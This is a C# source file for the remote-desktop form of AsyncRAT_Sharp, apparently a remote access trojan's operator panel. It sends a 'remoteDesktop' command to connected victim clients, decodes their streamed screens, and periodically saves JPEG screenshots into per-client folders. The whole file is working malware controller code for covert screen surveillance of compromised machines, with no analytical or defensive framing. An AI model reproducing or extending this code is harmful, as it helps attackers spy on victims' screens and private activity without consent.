using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using AsyncRAT_Sharp.Sockets;
using AsyncRAT_Sharp.MessagePack;
using System.Threading;
using System.Drawing.Imaging;
using System.IO;
using Encoder = System.Drawing.Imaging.Encoder;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormRemoteDesktop : Form
    {
        public FormRemoteDesktop()
        {
            InitializeComponent();
        }

        public Form1 F { get; set; }
        internal Clients C { get; set; }
        internal Clients C2 { get; set; }
        public bool Active { get; set; }
        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public Stopwatch RenderSW = Stopwatch.StartNew();
        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (!C.ClientSocket.Connected) this.Close();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (panel1.Visible == false)
            {
                panel1.Visible = true;
                button2.Top = panel1.Bottom + 5;
                button2.BackgroundImage = Properties.Resources.arrow_up;
            }
            else
            {
                panel1.Visible = false;
                button2.Top = pictureBox1.Top + 5;
                button2.BackgroundImage = Properties.Resources.arrow_down;
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            button2.Top = panel1.Bottom + 5;
            //button2.PerformClick();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (button1.Text == "START")
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
                msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value);
                decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                numericUpDown1.Enabled = false;
                numericUpDown2.Enabled = false;
                button1.Text = "STOP";
            }
            else
            {
                button1.Text = "START";
                numericUpDown1.Enabled = true;
                numericUpDown2.Enabled = true;
                try
                {
                    C2.ClientSocket.Dispose();
                    C2.Disconnected();
                    C2 = null;
                }
                catch { }
            }
        }

        private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
        {
            button2.Left = pictureBox1.Width / 2;
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (timerSave.Enabled)
            {
                timerSave.Stop();
                btnSave.Text = "START SAVE";
            }
            else
            {
                timerSave.Start();
                btnSave.Text = "STOP SAVE";
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\RemoteDesktop");
                if (!Directory.Exists(fullPath))
                    Directory.CreateDirectory(fullPath);
                Encoder myEncoder = Encoder.Quality;
                EncoderParameters myEncoderParameters = new EncoderParameters(1);
                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                pictureBox1.Image.Save(fullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
                myEncoderParameters?.Dispose();
                myEncoderParameter?.Dispose();
            }
            catch { }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
    }
}
